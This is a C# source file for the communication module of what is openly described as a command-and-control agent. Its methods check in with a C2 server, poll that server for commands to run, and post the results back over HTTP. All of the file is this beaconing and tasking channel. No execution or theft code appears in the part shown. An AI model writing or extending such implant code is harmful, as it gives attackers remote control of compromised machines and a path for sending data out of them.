using System;
using System.Net.Http;
using System.Text;
using System.Threading.Tasks;

// Handles communication with the C2 server
class Communicator
{
    private static readonly HttpClient client = new HttpClient();

    public static void CheckIn(ConfigManager config)
    {
        // Send a check-in HTTP request to C2
        var content = new StringContent($"{{\"agent_id\": \"{config.AgentId}\"}}", Encoding.UTF8, "application/json");
        var response = client.PostAsync($"{config.C2Url}checkin", content).Result;
        Console.WriteLine($"Checked in with status: {response.StatusCode}");
    }

    public static string ReceiveCommand(ConfigManager config)
    {
        // Poll C2 for commands
        var response = client.GetStringAsync($"{config.C2Url}get_command?agent_id={config.AgentId}").Result;
        // Assuming the response is the command to execute
        return response; // In a real scenario, you'd likely need to deserialize this
    }

    public static void SendResult(ConfigManager config, string result)
    {
        // Send command execution result to C2
        var content = new StringContent($"{{\"agent_id\": \"{config.AgentId}\", \"result\": \"{result}\"}}", Encoding.UTF8, "application/json");
        var response = client.PostAsync($"{config.C2Url}send_result", content).Result;
        Console.WriteLine($"Result sent with status: {response.StatusCode}");
    }
}
